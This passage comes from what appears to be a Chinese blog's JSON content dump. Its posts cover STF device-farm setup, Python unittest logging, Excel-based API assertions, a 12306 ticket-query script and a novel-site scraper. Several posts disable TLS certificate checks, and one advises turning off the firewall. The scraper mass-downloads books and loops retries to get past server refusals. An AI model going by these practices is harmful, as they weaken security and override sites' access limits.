http://www.tortall.net/projects/yasm/releases/yasm-1.3.0.tar.gztar xvf yasm-1.3.0.tar.gzcd yasm-1.3.0./configuremakemake install 验证环境是否ok: 1yasm --version 8.libsodium安装依次执行： 123456cd /opt/dongwget https://download.libsodium.org/libsodium/releases/libsodium-1.0.15.tar.gztar xvf libsodium-1.0.15.tar.gz./configuremakemake install 验证环境是否ok: 1whereis libsodium 9.zeromq安装依次执行： 12345678cd /opt/dongwget https://github.com/zeromq/libzmq/releases/download/v4.2.2/zeromq-4.2.2.tar.gztar xvf zeromq-4.2.2.tar.gzcd zeromq-4.2.2./configure遇到报错，yum install gcc-c++makemake install 打开文件： 1vi /etc/ld.so.conf 在该文件最后添加一行： 1/usr/local/lib 执行： 1ldconfig 10.protobuf安装依次执行： 1234567cd /opt/dongwget https://github.com/google/protobuf/releases/download/v3.5.0/protobuf-cpp-3.5.0.tar.gztar xvf protobuf-cpp-3.5.0.tar.gzcd protobuf-3.5.0./configure --prefix=/usr/local/protobufmakemake install 配置变量： 1vi /etc/profile 在文件末尾增加如下内容： 12export PATH=$PATH:/usr/local/protobuf/bin/export PKG_CONFIG_PATH=/usr/local/protobuf/lib/pkgconfig/ 执行： 1source profile 验证环境是否ok: 1protoc --version 11.pkg-config安装依次执行： 1234567cd /opt/dongwget http://pkgconfig.freedesktop.org/releases/pkg-config-0.29.2.tar.gztar xvf pkg-config-0.29.2.tar.gzcd pkg-config-0.29.2./configure --prefix=/usr/local/pkg-config --with-internal-glibmakemake install 验证环境是否ok: 1pkg-config --version 12.stf安装执行： 12cnpm install -g stf# 这里就用到了前面安装的cnpm，比npm速度快很多 下载完成后，检查STF所需环境是否都正常： 12cd /usr/local/node/node-v9.0.0-linux-x64/lib/node_modules/stf/bin./stf doctor STF需要的所有环境就已经全部搭建完成，虚拟机的话建议创建个快照，避免以后环境出问题后可以快速恢复 开启STF服务进入目录： 1cd /usr/local/node/node-v9.0.0-linux-x64/lib/node_modules/stf/bin 执行命令： 1./stf local --public-ip 192.168.1.152 --port 7100 --allow-remote &amp; --public-ip 192.168.1.152就是这个centos机器的IP，可以通过ifconfig命令获取。--port 7100端口默认是7100，也可以指定为其他端口。--allow-remote表示可以远程访问。&amp; 在后台执行服务。 打开web页面打开centos自带的火狐浏览器，访问127.0.0.1:7100或者192.168.1.152:7100即可进入。因为参数中设置了允许远程访问，在本机或者局域网内的其他机器的浏览器访问192.168.1.152:7100也可以正常访问，操作手机的反应速度很快，几乎没有延迟。 三、错误处理1.adb devices检测不到手机通过lsusb能够检测到USB设备，但是adb devices却检查不到，或者检测到手机却提示no permissions，如下 解决办法：新建文件 1vim /etc/udev/rules.d/51-android.rules 在文件中填写如下信息并保存： 1SUBSYSTEM==\"usb\", ATTRS&#123;idVendor&#125;==\"2717\",ATTRS&#123;idProduct&#125;==\"ff48\",MODE=\"0666\" 其中2717就是lsusb命令查出来的此设备的VID，ff48就是lsusb命令查出来的此设备的PID，0666默认不用修改，多个设备的话MODE都填写0666 2.STF环境校验有误Unexpected error checking ZeroMQ：Error：libzmq.so.5: cannot open shared object file: No such file or directorylibzmq.so.5这个文件所在的路径是/usr/local/lib 解决办法：(上面安装过程的第九步)打开文件： 1vi /etc/ld.so.conf 在该文件最后添加一行并保存： 1/usr/local/lib 执行： 1ldconfig 3.STF服务启动失败下图中的启动报错是因为rethinkdb没有启动导致的，也就是上面安装步骤的第五步，安装完后要在命令行输入rethinkdb将它启动 4.远程机器无法访问页面是因为centos防火墙导致的，关闭防火墙即可，注意centos7默认关闭防火墙的命令跟centos6.X有区别 参考文章https://www.jianshu.com/p/539ee1053da3https://testerhome.com/topics/16355","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"APP","slug":"APP","permalink":"http://yoursite.com/tags/APP/"},{"name":"STF","slug":"STF","permalink":"http://yoursite.com/tags/STF/"}]},{"title":"unittest测试中添加log","slug":"unittest测试中添加log","date":"2018-08-17T12:30:00.000Z","updated":"2018-12-17T02:30:56.787Z","comments":true,"path":"2018/08/17/unittest测试中添加log/","link":"","permalink":"http://yoursite.com/2018/08/17/unittest%E6%B5%8B%E8%AF%95%E4%B8%AD%E6%B7%BB%E5%8A%A0log/","excerpt":"","text":"前言在使用python + unittest执行测试用例时将必要的日志信息输出到本地文件和控制台方便定位问题。 一、详解1.首先新建一个公共文件publicData.py，导入logging模块，创建一个实列 1234import logginglogger = logging.getLogger()logger.setLevel(level=logging.DEBUG) #设置日志等级，INFO/DEBUG/WARNING/ERROR 2.创建handler，日志写入本地 1234handler = logging.FileHandler('E:/test.log') #设置日志输出路径handler.setLevel(logging.DEBUG) #设置打印的日志等级formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s') #设置打印格式handler.setFormatter(formatter) %(asctime)s 代表时间%(levelname)s 代表日志等级（INFO,DEBUG,ERROR等）%(message)s 代表输出的日志内容 3.创建console，执行任务时日志输出到控制台 12console = logging.StreamHandler()console.setLevel(logging.DEBUG) #设置控制台输出的日志等级 4.将创建的handler/console添加到实例logger 12logger.addHandler(handler)logger.addHandler(console) 二、整合打印日志一般按照日期来命名，导入time.strftime()方法打印当前时间并命名给日志,完整代码如下 12345678910111213141516171819def setlogging(): '''打印日志公共方法''' t = time.strftime('%Y-%m-%d') logger = logging.getLogger() logger.setLevel(level=logging.DEBUG) handler = logging.FileHandler('C:/foxrenderfarmApi/logs/' + t + \".log\") handler.setLevel(logging.DEBUG) formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s') handler.setFormatter(formatter) console = logging.StreamHandler() console.setLevel(logging.DEBUG) logger.addHandler(handler) logger.addHandler(console) return logger 三、调用在每个用例模块的类下面先导入上面写好的打印日志公共方法. 1234567from public.public_data import *class anaLysis(unittest.TestCase): '''分析模块接口测试''' logger = setlogging() logger.info('开始执行分析模块接口用例') 然后在需要打印日志的地方使用logger.ingo(‘这里是日志’)打印日志即可，由于我现在接口自动化测试用的unittest框架，每个接口用例需要打印的日志信息基本相同，因此直接在tearDown()方法下面添加需要的日志信息，例如我这里分别打印接口名、请求参数、返回结果。 1234def tearDown(self): logger.info(self.apiname) logger.info(self.data) logger.info(self.result) 注意以上方法基本上已经实现了本文讲述的在unittest中添加log的目的，在使用过程中发现，单个测试用例文件执行时日志没有什么问题，但是运行run.py文件执行所有模块测试用例的时候日志回打印多遍，这是因为unitest的执行策略导致，在每个模块的最开始都实例化了一个logger，如下图。 解决办法在公共文件写好的setlogging()方法下直接调用此方法，每个测试用例文件不再重复调用，导入后直接使用。 peili","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"接口测试","slug":"接口测试","permalink":"http://yoursite.com/tags/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/"},{"name":"log","slug":"log","permalink":"http://yoursite.com/tags/log/"},{"name":"unittest","slug":"unittest","permalink":"http://yoursite.com/tags/unittest/"}]},{"title":"HTTP接口测试自动校验多个字段，增强excel用例可维护性的方法","slug":"接口测试自动校验多个字段，增强excel用例可维护性的方法","date":"2018-08-10T12:30:00.000Z","updated":"2018-12-17T02:30:56.656Z","comments":true,"path":"2018/08/10/接口测试自动校验多个字段，增强excel用例可维护性的方法/","link":"","permalink":"http://yoursite.com/2018/08/10/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E8%87%AA%E5%8A%A8%E6%A0%A1%E9%AA%8C%E5%A4%9A%E4%B8%AA%E5%AD%97%E6%AE%B5%EF%BC%8C%E5%A2%9E%E5%BC%BAexcel%E7%94%A8%E4%BE%8B%E5%8F%AF%E7%BB%B4%E6%8A%A4%E6%80%A7%E7%9A%84%E6%96%B9%E6%B3%95/","excerpt":"","text":"前言当接口比较多，返回值也比较多，接口自动化测试校验返回值是否符合预期就得在每条测试用例后面添加多个assert校验，几百条用例的时候写校验语句就得上千条，为了简化代码，同时为了方便继续使用现有的excel表维护接口用例，因此将断言的方法重新封装为一个易用的函数来调用。 实现方式整理excel用例首先excel中的用例预期结果按照统一的格式来写，这是方便代码获取到预期结果并做下一步操作。例如这一个接口我要检验返回值中的三个字段，分别是code，message，result，预期结果这一栏每个字段后面写上英文冒号以及预期值，三个字段通过换行分隔开。 编写公共方法这里我新建一个public_data.py文件，在里面编写公共方法。 1.读取excel表公共方法这段代码是从excel读取内容的公共方法，它接收三个参数，分别是表的名称、行、列，可以取到具体哪一个框的内容。 123456def read_excel(sheet,row,col): '''读取excel表公共方法''' a = xlrd.open_workbook('E:/R-Test/datas/test_data.xls') b = a.sheet_by_name(sheet) c = b.cell_value(row,col) return c 2.判断每个接口用例执行几次断言公共方法这段代码是校验多个返回字段的公共方法，它接收五个参数，分别是self、表名、行、列、请求返回值。调用上面的读取excel表公共方法，从预期结果栏获取需要校验的字段名，预期值，此方法直接获取到的是一个字符串，现在通过换行符将需要校验的几个字段拆分，然后放入for循环用assert来断言。 1234567891011def assert_num(self,sheet,row,col,result): '''判断每个接口用例执行几次断言''' a = read_excel(sheet,row,col).split('\\n') #获取预期结果 b = read_excel(sheet, row, col+1).split('\\n') #获取结果解释，用于断言失败后打印必要信息 for i,j in zip(a,b): r = result[i.split(':')[0]] #r就是从返回值中取出的要进行校验的字段，result参数是需要传入的接口返回信息。 if type(r) is int: #如果返回值取出的数据为int格式，把他转为str，方便跟excel中取出的字符串比较,此框架从excel表中取出的内容为str格式 r = str(r) else: pass self.assertEqual(r, i.split(':')[1],msg='['+j+'校验有误]') 3.优化上一个方法实际测试过程中发现有些要校验的字段并不是在接口返回json的第一层，而是嵌套好几层的，例如下面这个接口的status字段。 因此需要校验这些字段的话首先要从excel表中拿到正确的字段名，同样在写excel表的时候就按照固定格式，那么字段名写成这样，每一层中间用短横线’-‘分开，注意如果测试的接口本身字段有短横线要注意区分，换成其他的符号。 然后修改上面的代码如下： 1234567891011121314151617181920def assert_num(self,sheet,row,col,result): '''判断每个接口用例执行几次断言''' a = read_excel(sheet,row,col).split('\\n') #获取预期结果 b = read_excel(sheet, row, col+1).split('\\n') #获取结果解释 for i,j in zip(a,b): x = i.split(':')[0] #x就是从返回值中取出的要进行校验的字段 if '-' in x: #判断若excel里面额字段不是一层，则转换成字典连续取值的格式 y = x.split('-') for key in y: #通过for循环依次获取下一层的字段值 result = result[key] r = result else: r = result[x] if type(r) is int: #如果返回值取出的数据为int格式，把他转为str，方便跟excel中取出的字符串比较,此框架从excel表中取出的内容为str格式 r = str(r) if type(r) is bool: #有些接口返回值是布尔值，转换成字符串 r = str(r) else: pass self.assertIn(i.split(':')[1], r,msg='['+j+'校验有误]') 在接口测试用例中调用在测试用例所在的文件中导入公共方法，然后在接口测试用例执行完毕后调用断言校验的方法就可以自动判断有几条字段需要校验，分别校验并打印结果。 peili","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"unittest","slug":"unittest","permalink":"http://yoursite.com/tags/unittest/"},{"name":"excel","slug":"excel","permalink":"http://yoursite.com/tags/excel/"}]},{"title":"命令行下mysql中文乱码解决办法","slug":"命令行下mysql中文乱码解决办法","date":"2018-08-08T04:30:00.000Z","updated":"2018-12-17T02:30:56.842Z","comments":true,"path":"2018/08/08/命令行下mysql中文乱码解决办法/","link":"","permalink":"http://yoursite.com/2018/08/08/%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8Bmysql%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/","excerpt":"","text":"前言cmd命令行下执行sql遇到中文乱码的问题，如下图查询语句 问题原因cmd客户端默认编码为”gbk”编码，mysql我设置的默认编码是”utf8”,在cmd中指明mysql的编码和想要的编码即可。 操作步骤 打开cmd,输入mysql -u root -p，输入密码进入mysql交互界面 设置编码set character_set_client=gbk; 再设置set character_set_results=gbk;再重新执行查询语句看到中文已经显示正常","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"},{"name":"cmd","slug":"cmd","permalink":"http://yoursite.com/tags/cmd/"}]},{"title":"Windows创建软连接","slug":"windows创建软连接","date":"2018-06-28T16:00:00.000Z","updated":"2018-12-17T02:30:56.819Z","comments":true,"path":"2018/06/29/windows创建软连接/","link":"","permalink":"http://yoursite.com/2018/06/29/windows%E5%88%9B%E5%BB%BA%E8%BD%AF%E8%BF%9E%E6%8E%A5/","excerpt":"","text":"mklink命令在C:\\Users\\PEI\\OneDrive目录下创建D:\\blog目录的软连接，并且创建后的软连接目录命名为hexo_blog 1mklink &#x2F;D C:\\Users\\PEI\\OneDrive\\hexo_blog D:\\blog 第一个参数 /D参数表示创建的是一个目录的软连接，不添加这个参数默认的是文件的软链接 第二个参数 C:\\Users\\PEI\\OneDrive&lt;font color=green&gt;hexo_blog为软连接所在的目录，hexo_blog是创建软连后重命名的目录 第三个参数 D:\\blog是源目录 注意：以管理员权限打开CMD运行此命令，否则会提示权限不足。peili","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"cmd","slug":"cmd","permalink":"http://yoursite.com/tags/cmd/"},{"name":"Windows","slug":"Windows","permalink":"http://yoursite.com/tags/Windows/"}]},{"title":"12306火车票查询","slug":"12306车票查询","date":"2018-06-02T13:00:00.000Z","updated":"2019-01-15T03:17:12.220Z","comments":true,"path":"2018/06/02/12306车票查询/","link":"","permalink":"http://yoursite.com/2018/06/02/12306%E8%BD%A6%E7%A5%A8%E6%9F%A5%E8%AF%A2/","excerpt":"","text":"前言通过12306官网的几个接口来获取火车余票信息，结合邮件模块发现余票时就发送邮件给自己提示，虽然达不到黄牛那种毫秒级别，秒级别的速度，在不繁忙的线路和时间段还是有点用处。注：目前版本只做了余票查询，后期有时间再加入票价信息等，由于12306登陆验证码以及登陆态的失效时间实在变态，要实现完全自动化还需购买付费人工打码服务，因此暂时不不计划做自动购票功能。 查询余票接口首先打开12306官网，并进入余票查询页面，同时开启chrome浏览器F12控制台，以北京到上海为例，搜索2018年6月5日的余票信息，点击搜索按钮，可以在控制台发送了一条GET请求，请求结果以json字符串的形式放回，里面有查询到的余票信息。 通过python-requests来请求一下这个接口，比较意外的是这个接口并没有校验header信息，因此我们不用添加header。在测试中发现虽然12306官网主页提供了证书下载，但是这个https请求并不是必须校验证书，将requests方法中的verify参数设置为False取消校验也能正常返回结果。 1234567import requestsurl = 'https://kyfw.12306.cn/otn/leftTicket/query?leftTicketDTO.train_date=2018-06-05&amp;leftTicketDTO.from_station=BJP&amp;leftTicketDTO.to_station=SHH&amp;purpose_codes=ADULT'requests.packages.urllib3.disable_warnings()r = requests.get(url,verify=False).json()yupiao = r['data']['result']print(yupiao) 如下图返回结果是个列表，每一个元素就是一条火车线路，包含始发站代码，终点站代码，发车时间，每种座位的余票等信息，通过” | “分隔，需要注意的是每种座位的余票数量与网页展示的位置前后顺序并不是一一对应的，这个花了不少时间来确定每个对应关系。 将上一步返回结果放入循环中，每一个元素按照” | “符号分割，并从分割后的列表中依次取出需要的内容（城市代码，时间，车次，作为余票等信息）。 123456789101112131415161718192021222324252627282930313233343536373839import requestsfrom tabulate import tabulate#查询余票def query(): url = 'https://kyfw.12306.cn/otn/leftTicket/queryZ?leftTicketDTO.train_date=2018-06-05&amp;leftTicketDTO.from_station=BJP&amp;leftTicketDTO.to_station=SHH&amp;purpose_codes=ADULT' requests.packages.urllib3.disable_warnings() r = requests.get(url,verify=False).json() yupiao = r['data']['result'] table_header = ['车次','始发站','终点站','始发时间','到站时间','历时','商务特等座','一等座','二等座','高级软卧','软卧','动卧','硬卧','软座','硬座','无座'] #表格头 table_data = [] #数据添加至列表，作为表格的主体内容 for i in yupiao: a = i.split('|') #分割字符串，a是个列表 is_null = a[0] #判断是否有票 train_code = a[3] #车次 start_city_code = a[4] #始发站城市代码 end_city_code = a[5] #终点站城市代码 start_time = a[8] #终点站开始时间 end_time = a[9] #终点站到达时间 total_time = a[10] #总共历时 shangwutedeng = a[32] #商务特等座 yideng = a[31] #一等座 erdeng = a[30] #二等座 gaojiruanwo = a[21] #高级软卧 ruanwo = a[23] #软卧 dongwo = a[33] #动卧 yingwo = a[28] #硬卧 ruanzuo = a[24] #软座 yingzuo = a[29] #硬座 wuzuo = a[26] #无座 #添加到元组 yupiao_tuple = (train_code,start_city_code,end_city_code,start_time,end_time,total_time,shangwutedeng,yideng,erdeng,gaojiruanwo,ruanwo,dongwo,yingwo,ruanzuo,yingzuo,wuzuo) table_data.append(yupiao_tuple) print(tabulate(table_data,headers=table_header,tablefmt='grid')) 在上面代码中使用了tabulate库，它可以把结果输出成易读的表格样式，更多使用方法点击这里。 参数化准备再回头看之前请求的URL，这个GET请求有四个请求参数，分别代表如下： 1234leftTicketDTO.train_date --&gt; 乘车日期leftTicketDTO.from_station --&gt; 始发站代码(例如北京北：VAP)leftTicketDTO.to_station --&gt; 终点站代码(例如上海虹桥：AOH)purpose_codes --&gt; 车票类型(普通票：ADULT，学生票：0X00) 第一个和第四个参数好填写，始发站和终点站代码我们现在并没有对应的表，不知道每个站点对应的代码，在网站上找一下。我们在页面上手动修改始发站和终点站的时候发现并没有发送新的https请求，可以猜测所有的站点信息应该是在一个js文件里面，然后通过页面的js方法来选择不同的站名，现在F12控制台切换至JS模块下，刷新这个余票查询页面。 从上图可以看到刷新页面后有个名称为station_name.js的js文件，单击一看果然是存放了所有的站点信息，将这个文件的url复制重新打开一个页面可以看到，火车站点信息放在station_name变量后面的字符串，中间有很多” | “作为分隔符，观察发现每五个符号分隔的内容为一组，刚好是一个站点的信息。 我们需要把这个很长的字符串重新分隔成我们想要的格式，将这个很长的字符串全部复制到一个py文件,通过以下函数来处理： 123456#查询每个站点名称/拼音/缩写/代码def get_station_code(): code = all_station.split('|') #字符串的所有信息按照\"|\"符号分割，结果是一个列表 n = 5 # 大列表中几个数据组成一个小列表，每五个元素为一个站点信息组合 station_code = [code[i:i + n] for i in range(0, len(code), n)] #每一个火车站点信息为一个元素放在此列表 print(station_code) 执行结果如下，长字符串已经被转换成一个大列表，列表中的每个元素分别是一个小列表，小列表包含火车站点的五个信息，其中最后一个小列表只有一个元素，应该是备用的字段现在没有用，直接删除。 用户输入判断上一步已经整理好了所有的火车站点信息，下面代码实现用户输入火车站名时找到对应的站点代码， 1234567891011121314151617181920212223242526272829#根据用户输入的站点名或者缩写在站点列表中检索对应的代码def retrieve_station(): a = input('请输入始发站、终点站、日期，用一个空格隔开，按回车键查询，参考格式：北京 上海 20180605\\n:') start_city = a.split(' ')[0] end_city = a.split(' ')[1] while True: date = str(a.split(' ')[2]) if len(date) == 8: #用户日期是否是8位正整数 newdate = date[:4] + '-' + date[4:6] + '-' + date[6:] #转换为查询接口所需的日期参数格式，例如2018-06-08 break else: print('日期输入有误，请重新输入') #检索始发站代码 for i in station_code: #station_code就是上一步整理好的站点列表 if start_city == i[1]: start_city_code = i[2] #始发站代码 break else: pass #检索目的地代码 for i in station_code: #station_code就是上一步整理好的站点列表 if end_city == i[1]: end_city_code = i[2] #终点站代码 break else: pass return newdate,start_city_code,end_city_code 上面的函数执行后返回日期,始发站代码，终点站代码，将它们格式化传到请求的URL中重新请求就得到了想要的结果，修改之前的查询余票函数如下。 12345#查询余票def query(): station_info = retrieve_station() url = 'https://kyfw.12306.cn/otn/leftTicket/query?leftTicketDTO.train_date=%s&amp;leftTicketDTO.from_station=%s&amp;leftTicketDTO.to_station=%s&amp;purpose_codes=ADULT' %(station_info[0],station_info[1],station_info[2]) ... 最终效果xx","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"接口测试","slug":"接口测试","permalink":"http://yoursite.com/tags/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/"}]},{"title":"requests中HTTPS请求的处理","slug":"requests中HTTPS请求的处理","date":"2018-04-27T12:30:00.000Z","updated":"2018-12-17T02:30:56.835Z","comments":true,"path":"2018/04/27/requests中HTTPS请求的处理/","link":"","permalink":"http://yoursite.com/2018/04/27/requests%E4%B8%ADHTTPS%E8%AF%B7%E6%B1%82%E7%9A%84%E5%A4%84%E7%90%86/","excerpt":"","text":"前言在接口测试或者爬虫的时候经常遇到HTTPS的请求，直接用python中requests方法请求的话会可能出现如下报错。 解决办法在requests添加verify参数，verify是用来验证SSL证书开关，默认是True，如果不想验证的话将它设置为False 12r = requests.get(url,verify=False)print(r.status_code) 现在已经不影响请求的结果，但是每次请求的时候会出现警告，看着比较不舒服。想要去掉这个警告提示，需要在请求之前加上如下代码。 123requests.packages.urllib3.disable_warnings()r = requests.get(url,verify=False)print(r.status_code) peili","categories":[{"name":"爬虫","slug":"爬虫","permalink":"http://yoursite.com/categories/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"接口测试","slug":"接口测试","permalink":"http://yoursite.com/tags/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/"},{"name":"爬虫","slug":"爬虫","permalink":"http://yoursite.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"python小说爬虫","slug":"python小说爬虫","date":"2018-04-25T12:30:00.000Z","updated":"2019-11-05T14:07:34.701Z","comments":true,"path":"2018/04/25/python小说爬虫/","link":"","permalink":"http://yoursite.com/2018/04/25/python%E5%B0%8F%E8%AF%B4%E7%88%AC%E8%99%AB/","excerpt":"","text":"前言很久没有写爬虫了，最近接到一个抓取小说的项目顺便做此纪录练练手，之后工作中可能也会有部分场景要用到爬虫，爬取竞争对手进行数据分析什么的。目标网站：潇湘书院环境准备： python3 requests库 BeautifulSoup库 整体思路抓取这个小说网站免费板块的所有内容，查看页面发现这个板块一共有6697页，每页有20本小说，那整体思路就是先抓取每页的20个小说名称和url，然后进入每本小说的阅读地址，拿到每一个章节的标题和url，抓取每章节的正文内容并写到本地txt文本中。 单页分析这里请求使用requests，解析页面用非常方便的BeautifulSoup，在一个文章标题上右键检查，在高亮的这条a标签右键，copy selector，通过这条selector来定位BeautifulSoup解析后小说所在的位置。 1body &gt; div.content &gt; div &gt; div &gt; div.inner-mainbar &gt; div.search-result &gt; div.result-list &gt; ul &gt; li:nth-child(1) &gt; div &gt; h4 &gt; a 其中li:nth-child(1)很明显是指这个小说在当前页面小说列表中排列第一个，我们想要本页面所有的20本小说，所以就删掉这个:nth-child(1)，再将selector语句精简一下只要能定位到即可，如下： 1div.result-list &gt; ul &gt; li &gt; div &gt; h4 &gt; a 然后将它写入代码，print查看一下结果。 1234567import requests,osfrom bs4 import BeautifulSoupwebdata = requests.get('http://www.xxsy.net/search?vip=0&amp;sort=2')soup = BeautifulSoup(webdata.text,'lxml')books = soup.select('div.result-list &gt; ul &gt; li &gt; div &gt; h4 &gt; a')print(books) 结果是一个列表，列表中有20个元素，分别对应的20个小说，我们想要的是每个元素中href后面的链接和小说的名字，用循环提取出来。 123456...for book in books: bookname = book.text bookurl = 'http://www.xxsy.net' + book.get('href') bookid = book.get('href').split('/')[-1].split('.')[0] print(bookname,bookurl,bookid) 这样就很简单的拿到了单个页面20本小说的标题和url地址，可以看到上面我把地址中的一串数字用单独取出来了，这个数字其实就是小说对应的唯一ID，后面要用到。 章节分析点击一个小说进入详情页面，切换至”作品目录”下可以看到所有的章节，这时候在一个章节上右键检查，跟上面方法一样，同样可以很简单的获取到该小说所有章节的名称和url地址以及章节ID。 为了在一篇文章介绍尽可能多的方法，这里我不用上面这个地方来获取章节信息，从另一个地方进入。点击“开始阅读”进入第一章节的正文，在页面的左边可以看到一个“目录”按钮，点看以后就能看到所有的章节名称了。然而在这些章节名称上右键发现当前页面禁用了鼠标右键功能，无法检查元素当然也就不能copy它的selector。 这种按钮的点击肯定是向服务器发送了请求的，打开fiddler进行抓包，再次点击目录按钮，此时可以看到这个请求已经被成功捕获，点击这条请求查看详细信息，这个接口的功能就是查询所有的章节信息。 真实的请求地址是http://www.xxsy.net/partview/GetChapterListNoSub?bookid=945608&amp;isvip=0，其中bookid就是我们前面找到的bookid，这里可以做成参数化依次传入其他小说的ID。 1234567...url = 'http://www.xxsy.net/partview/GetChapterListNoSub?bookid=945608&amp;isvip=0'titles = BeautifulSoup(requests.get(url).text,'lxml').select('ul &gt; li &gt; a')for title in titles: titlename = title.text #章节名称 titleurl = 'http://www.xxsy.net' + title.get('href') #章节地址 print(titlename,titleurl) 正文下载上一步取到的titleurl是每一章节的阅读地址，直接requests请求并解析拿到正文内容 1contents = BeautifulSoup(requests.get(titleurl).text, 'lxml').select('div#auto-chapter &gt; p') #正文内容 返回结果是一个列表，每一个元素是一个段落，将每一段内容前后无用的标签剔除并写到本地的txt文本，写入方式为a+,每次写入时在后面追加，不会覆盖之前的内容，文本自动按照前面获取到的小说名来命名。 123456...for content in contents: content = str(content).replace('&lt;p&gt;', '\\n').replace('&lt;/p&gt;', '') f = open(path + '%s.txt' % bookname, 'a+') f.write(content) f.close() 到此为止三个步骤已经完成，可以顺利的爬下一个章节的内容了，现在通过几个for循环将这几个步骤整合，就可以源源不断的开始下载小说了。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#coding=utf-8import requests,time,osfrom bs4 import BeautifulSouppath = r'C:\\Users\\lipei\\Desktop\\潇湘书院爬虫\\小说\\\\' #本地存放小说的路径def get_books(url): webdata = requests.get(url,timeout=60) soup = BeautifulSoup(webdata.text,'lxml') books = soup.select('div.result-list &gt; ul &gt; li &gt; div &gt; h4 &gt; a') for book in books: bookid = book.get('href').split('/')[-1].split('.')[0] #小说ID作为下一个请求ur中的参数 bookname = book.text #小说名称 bookurl = 'http://www.xxsy.net' + book.get('href') #小说url地址 if bookname+'.txt' in oldlists: #判断是否已经下载过，若存在则跳过 continue else: pass print('=====================正在下载【' + bookname + '】=====================') url = 'http://www.xxsy.net/partview/GetChapterListNoSub?bookid=%s&amp;isvip=0' % bookid titles = BeautifulSoup(requests.get(url,timeout=60).text,'lxml').select('ul &gt; li &gt; a') for title in titles: titleurl = 'http://www.xxsy.net' + title.get('href') #章节url地址 titlename = title.text #章节名称 # print(titlename,titleurl) try: f = open(path + '%s.txt' % bookname, 'a+') #章节名称写到txt文本 f.write('\\n'*2 + titlename + '\\n') f.close() except: pass contents = BeautifulSoup(requests.get(titleurl,timeout=60).text, 'lxml').select('div#auto-chapter &gt; p') for content in contents: content = str(content).replace('&lt;p&gt;', '\\n').replace('&lt;/p&gt;', '') try: f = open(path + '%s.txt' % bookname, 'a+') #正文内容卸载txt文本，紧接在章节名称的下面 f.write(content) f.close() except: pass print(titlename + '[已下载]')if __name__ == \"__main__\": urls = ['http://www.xxsy.net/search?vip=0&amp;sort=2&amp;pn=&#123;&#125;'.format(i) for i in range(6697)] #免费板块每一页的url通过最后的pn参数控制 global oldlists oldlists = os.listdir(path) #爬虫开始之前检查当前目录已有的文件 for url in urls: get_books(url) #控制每天爬取的数量，达到要求后停止任务，通过任务开始前后目录中的文件数量相减来判断 newlists = os.listdir(path) num = len(newlists) - len(oldlists) if num &gt;= 20: print('今日任务下载完毕，今日下载小说%d本' % num) break else: pass 写在最后在测试过程中发现短时间持续请求该网站的话会可能被服务器拒绝，但是并没有封禁IP，这可能是这个网站唯一的反爬措施了，然而并没有卵用，将请求放在一个无限循环里面，若被拒绝就自动重连，连上以后跳出循环。后面如果遇到封禁IP的网站再讲如何通过更换IP来规避。 1234567...while True: try: webdata = requests.get(url,timeout=60) break #连接成功就跳出循环 except: time.sleep(3) peili","categories":[{"name":"爬虫","slug":"爬虫","permalink":"http://yoursite.com/categories/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"爬虫","slug":"爬虫","permalink":"http://yoursite.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"python操作txt文本的几种模式","slug":"python操作txt文本的几种模式","date":"2018-03-28T12:30:00.000Z","updated":"2018-12-17T02:30:56.694Z","comments":true,"path":"2018/03/28/python操作txt文本的几种模式/","link":"","permalink":"http://yoursite.com/2018/03/28/python%E6%93%8D%E4%BD%9Ctxt%E6%96%87%E6%9C%AC%E7%9A%84%E5%87%A0%E7%A7%8D%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"模式 可做操作 若文件不存在 是否覆盖 r 只能读 报错 - r+ 可读可写 报错 是 w 只能写 创建 是 w+ 可读可写 创建 是 a 只能写 创建 否，追加写 a+ 可读可写 创建 否，追加写 xx","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"python+django实现登陆功能（下篇）","slug":"python+django实现登陆功能（下篇）","date":"2018-02-07T14:00:00.000Z","updated":"2019-07-09T11:46:01.414Z","comments":true,"path":"2018/02/07/python+django实现登陆功能（下篇）/","link":"","permalink":"http://yoursite.com/2018/02/07/python+django%E5%AE%9E%E7%8E%B0%E7%99%BB%E9%99%86%E5%8A%9F%E8%83%BD%EF%BC%88%E4%B8%8B%E7%AF%87%EF%BC%89/","excerpt":"","text":"在《python+django实现登陆功能（上篇）》介绍了django的安装配置，本片文章介绍如何用django快速实现登陆功能，开始之前先打开上篇创建的项目，并启动django服务。 Django的MTV模型 